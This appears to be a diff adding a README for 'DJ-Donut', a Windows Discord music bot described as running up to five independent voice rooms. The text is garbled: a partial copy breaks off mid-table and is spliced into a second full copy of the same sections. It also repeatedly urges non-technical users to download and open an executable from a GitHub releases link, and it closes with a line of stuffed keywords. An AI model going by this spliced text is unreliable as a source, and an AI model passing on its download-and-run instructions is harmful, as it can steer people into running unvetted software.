+- Multi-room music playback for 1 to 5 Discord voice channels.
+- Independent queues for every room.
+- Independent volume and playback controls.
+- Slash command support for easy use in Discord.
+- Playback controls such as play, pause, resume, skip, stop, seek, loop, and shuffle.
+- Queue management with current track details.
+- Six-language interface support.
+- Windows-friendly download flow for non-technical users.
+- Docker support for advanced users.
+- Built with Discord.py v2.7.0+ and Lavalink v4.0+.
+- MIT licensed.
+
+## 🖥️ What You Need
+
+Before you begin, make sure you have:
+
+- A Windows 10 or Windows 11 computer.
+- A stable internet connection.
+- A Discord account.
+- Permission to add bots to your Discord server.
+- At least 4 GB of RAM recommended for smooth multi-room use.
+- At least 2 GB of free disk space for the app and music cache.
+- A Discord voice channel where you want to play music.
+
+You do not need to know how to program or use a command line. The download and setup are intended to be simple.
+
+## 📥 Download and Start on Windows
+
+Visit this link to download the application:
+
+[Download DJ-Donut from GitHub Releases](https://github.com/Acousticsaurabh/DJ-Donut/releases)
+
+Save the download in a place you can find again, such as your Downloads folder. When the download finishes, open the application to start DJ-Donut. The first screen guides you through the basic setup.
+
+DJ-Donut v1.7.0 is the current release. Use the latest release shown on the page for the newest fixes and features.
+
+## 🚀 First-Time Setup
+
+1. Open DJ-Donut after the download finishes.
+2. Follow the setup screen shown by the app.
+3. Choose how many music rooms you want to run, from 1 to 5.
+4. Use the invitation link shown inside DJ-Donut to add the bot to your Discord server.
+5. Join a Discord voice channel.
+6. Type `/play` in a text channel and enter a song name or link.
+7. Repeat the same steps for each room you want to use.
+
+The setup is made for everyday Discord users. You do not need to edit configuration files or understand how the bot cluster works behind the scenes.
+
+## 🏠 Multi-Room Basics
+
+DJ-Donut shines when you use more than one room. Each room behaves like its own small music player.
+
+| Room | Example Use | Separate Controls |
+| --- | --- | --- |
+| Room 1 | Main lounge music | Queue, volume, pause, skip |
+| Room 2 | Gaming voice chat | Queue, volume, loop, shuffle |
+| Room 3 | Study or focus room# 🍩 DJ-Donut - Run Multiple Music Rooms at Once
+
+[![Download DJ-Donut](https://img.shields.io/badge/Download%20DJ--Donut-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Acousticsaurabh/DJ-Donut/releases)
+
+DJ-Donut is a Discord music bot that can play music in several voice channels at the same time. A single copy of the app runs 1 to 5 music rooms, and every room keeps its own queue, volume, and playback controls. You can have calm background music in one channel and a loud party playlist in another without the two ever mixing.
+
+This guide is written for everyday Discord users. You do not need to know how to program, and you do not need to open a terminal or edit any files.
+
+## 🎵 What DJ-Donut Does
+
+Most music bots can only handle one voice channel at a time. If two people in your server want different songs, someone has to give up. DJ-Donut fixes that by running several bot rooms inside one lightweight app.
+
+Each room behaves like a separate music player:
+
+- Each room has its own song queue.
+- Each room has its own volume level.
+- One room can be paused while another keeps playing.
+- Skipping a song in Room 1 does not touch Room 2.
+- Rooms can loop a playlist or shuffle songs independently.
+- Each room shows what is currently playing.
+
+DJ-Donut is built for gaming servers, study groups, friend circles, community servers, and any Discord space where people want different music in different channels at the same time.
+
+## ✨ Main Features
+
+- Multi-room music playback for 1 to 5 Discord voice channels.
+- Fully independent queues for every room.
+- Independent volume and playback controls per room.
+- Slash commands that are easy to remember and use.
+- Playback controls including play, pause, resume, skip, stop, seek, loop, and shuffle.
+- Queue management with current track details.
+- Six-language interface support.
+- Windows-friendly download flow for non-technical users.
+- Docker support for users who prefer containers.
+- Built on Discord.py v2.7.0+ and Lavalink v4.0+.
+- Released under the MIT license.
+
+## 🖥️ What You Need
+
+Before you begin, check that you have:
+
+- A Windows 10 or Windows 11 computer.
+- A stable internet connection.
+- A Discord account.
+- Permission to add bots to your Discord server.
+- At least 4 GB of RAM for smooth multi-room playback.
+- At least 2 GB of free disk space for the app and music cache.
+- A Discord voice channel where you want to play music.
+
+If you are not sure whether you can add bots to a server, ask the server owner or an administrator. Adding a bot requires the "Manage Server" permission.
+
+## 📥 Download and Install on Windows
+
+Visit this link to download the application:
+
+[Download DJ-Donut from GitHub Releases](https://github.com/Acousticsaurabh/DJ-Donut/releases)
+
+Save the download somewhere you can find it again, such as your Downloads folder. When the download finishes, open the application to start DJ-Donut. The first screen guides you through the basic setup.
+
+The current release is v1.7.0. Always use the newest release listed on the page so you get the latest fixes and features. If you have an older copy, download the new release and replace your old files.
+
+## 🚀 First-Time Setup
+
+1. Open DJ-Donut after the download finishes.
+2. Follow the setup screen that appears.
+3. Choose how many music rooms you want to run, from 1 to 5.
+4. Use the invitation link shown inside DJ-Donut to add the bot to your Discord server.
+5. Join a Discord voice channel.
+6. Type `/play` in a text channel and enter a song name or a link.
+7. Repeat the same steps for each additional room you want to use.
+
+Once a room is playing, you can control it entirely from Discord with slash commands. No extra windows or settings pages are needed for normal use.
+
+## 🏠 Multi-Room Basics
+
+DJ-Donut works best when you use more than one room. Each room is a separate player with a separate queue.
+
+| Room | Example Use | Separate Controls |
+| --- | --- | --- |
+| Room 1 | Main lounge music | Queue, volume, pause, skip |
+| Room 2 | Gaming voice chat | Queue, volume, loop, shuffle |
+| Room 3 | Study or focus room | Queue, volume, seek, stop |
+| Room 4 | Late-night chill | Queue, volume, loop |
+| Room 5 | Party channel | Queue, volume, shuffle |
+
+You can run as few as one room. Start with one, get comfortable with the commands, then add more rooms when you need them.
+
+## ⌨️ Slash Commands
+
+Type a forward slash in any text channel to see the list of available commands. Common commands include:
+
+- `/play` — add a song or playlist to the queue and start playing.
+- `/pause` — pause the current song in that room.
+- `/resume` — continue playing after a pause.
+- `/skip` — move to the next song in the queue.
+- `/stop` — stop playback and clear the room.
+- `/queue` — show the songs waiting in that room.
+- `/nowplaying` — show the track that is currently playing.
+- `/volume` — change the volume for that room.
+- `/loop` — repeat the current song or the whole queue.
+- `/shuffle` — mix up the order of the queue.
+- `/seek` — jump to a specific point in the current song.
+
+Every command only affects the room you are using, so you never have to worry about disturbing another channel.
+
+## 🔊 Audio and Playback Tips
+
+- Use a wired connection or strong Wi-Fi for the smoothest playback.
+- Keep your music cache folder on a drive with free space.
+- If a song takes a long time to start, wait a few seconds before skipping.
+- Very large playlists take longer to load than single songs.
+- Lower the volume on busy rooms if your computer feels slow.
+- Close other heavy apps if you run all five rooms at once.
+
+## 🌍 Language Support
+
+DJ-Donut supports six languages in its interface. The language is chosen during setup or changed later from the app's settings screen. Changing the language does not affect queues or playback.
+
+## 🛠️ Troubleshooting
+
+Problem: The bot does not appear in my server.
+Solution: Open the invitation link inside DJ-Donut again and make sure you finish the authorization steps.
+
+Problem: Music does not start.
+Solution: Confirm you are already inside a voice channel before typing `/play`.
+
+Problem: The wrong music is playing in a room.
+Solution: Use `/queue` in that room to see its songs, then use `/stop` and start fresh.
+
+Problem: The app feels slow with five rooms.
+Solution: Reduce the number of rooms in the setup screen and close other programs.
+
+Problem: The download did not finish.
+Solution: Return to the releases page and download the newest release again.
+
+## 💬 Getting Help
+
+If something is not working, open the repository page and check the issues section for known problems. Include the version you are using (v1.7.0) and a short description of what happened. Other users may already have posted the same question.
+
+## 📄 License
+
+DJ-Donut is released under the MIT license, which means you can use, change, and share it freely.
+
+Keywords: dj-donut, discord music bot, multi-room music, discord bot, lavalink, discord.py, python music bot, self-hosted music bot, discord voice channels, windows music bot, docker discord bot, open source discord bot
